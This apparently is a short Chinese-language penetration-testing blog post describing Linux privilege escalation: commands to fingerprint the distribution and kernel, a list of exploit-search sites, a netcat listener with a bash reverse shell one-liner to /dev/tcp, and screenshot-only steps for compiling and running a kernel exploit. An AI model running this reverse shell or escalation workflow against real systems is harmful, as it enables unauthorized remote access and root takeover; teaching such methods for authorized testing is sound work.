---
draft: false
date: 2016-08-09 19:23:13
title: Linux 下系统漏洞提权
description: 
categories:
  - Pentest
tags:
  - intranet
---

### 0x00 Linux下的提权
Linux下一般都是系统漏洞提权，分为以下几个步骤：
```
1. 获取系统版本号
2. 根据系统版本号找对应exp
3. 反弹shell
4. 尝试利用
```

### 0x01 提权
* 获取系统版本号
    * 获取发行版本
        * cat /etc/*-release
        * cat /etc/issue
        * cat /etc/lsb-release
        * cat /etc/redhat-release
    * 获取内核版本
        * cat /proc/version
        * uname -a
        * uname -mrs
        * rpm -q kernel
        * dmesg | grep Linux
        * ls /boot | grep vmlinuz
* 根据系统版本号找对应exp
    * http://www.exploit-db.com
    * http://1337day.com
    * http://www.securiteam.com
    * http://www.securityfocus.com
    * http://www.exploitsearch.net
    * http://metasploit.com/modules
    * http://securityreason.com
    * http://seclists.org/fulldisclosure
    * http://www.google.com
* 反弹shell
    * 本地：```nc -l -p 8888```
    * 目标机器：```/bin/bash -i >& /dev/tcp/10.10.10.10/8888 0>&1```
* 尝试利用

### 0x02 实例
* 得到系统版本号
![得到系统版本号](/img/post/privilge_escalation_linux_get_sys_version.png)

* 找对应exp
![找相应exp](/img/post/privilge_escalation_linux_search_exp.png)
![保存exp源码](/img/post/privilge_escalation_linux_exp_code.png)

* 反弹shell
![反弹shell](/img/post/privilge_escalation_linux_webshell_rebound_shell.png)

* 提权
![下载exp源码](/img/post/privilge_escalation_linux_write_exp_code.png)
![编译exp源码](/img/post/privilge_escalation_linux_compile_exp_code.png)
![运行exp](/img/post/privilge_escalation_linux_run_exp.png)
